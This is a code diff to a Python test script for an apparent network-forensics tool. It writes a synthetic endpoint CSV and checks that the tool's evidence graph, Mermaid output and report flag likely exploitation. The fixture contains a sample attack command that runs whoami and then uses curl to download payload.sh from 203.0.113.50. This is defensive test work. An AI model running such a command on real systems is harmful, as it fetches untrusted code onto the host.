@@ -6,16 +6,22 @@ import sys
 from pathlib import Path
 
 PROJECT_ROOT = Path(__file__).resolve().parents[1]
+if str(PROJECT_ROOT) not in sys.path:
+    sys.path.insert(0, str(PROJECT_ROOT))
+
+from src.parser.pcap_parser import parse_network_events
 
 
 def main() -> None:
     subprocess.run([sys.executable, "tests/make_demo_pcap.py"], cwd=PROJECT_ROOT, check=True)
+    first_event = parse_network_events(str(PROJECT_ROOT / "data/pcap/demo_attack.pcap"))[0]
+    endpoint_time = (first_event.timestamp or 0) + 30
     tmp = PROJECT_ROOT / "data" / "tmp"
     tmp.mkdir(parents=True, exist_ok=True)
     endpoint = tmp / "endpoint_multisource.csv"
     endpoint.write_text(
         "timestamp,host,process_name,command_line,dst_ip,dst_port\n"
-        '2026-06-27T06:41:00Z,10.10.10.20,bash,"bash -c whoami; curl http://203.0.113.50/payload.sh -o /tmp/payload.sh",203.0.113.50,8080\n',
+        f'{endpoint_time},10.10.10.20,bash,"bash -c whoami; curl http://203.0.113.50/payload.sh -o /tmp/payload.sh",203.0.113.50,8080\n',
         encoding="utf-8",
     )
 
@@ -53,9 +59,13 @@ def main() -> None:
     assert "process_external_connection" in relations
     graph_nodes = {item["node_id"] for item in analysis["evidence_graph"]["nodes"]}
     assert "external:203.0.113.50:8080" in graph_nodes
+    mermaid = analysis["evidence_graph"]["mermaid"]
+    assert mermaid.startswith("flowchart TD")
+    assert "process_external_connection" in mermaid
     report = report_path.read_text(encoding="utf-8")
     assert "endpoint1-1" in report
     assert "## Evidence Graph" in report
+    assert "```mermaid" in report
     assert "Likely successful exploitation" in report
 
 
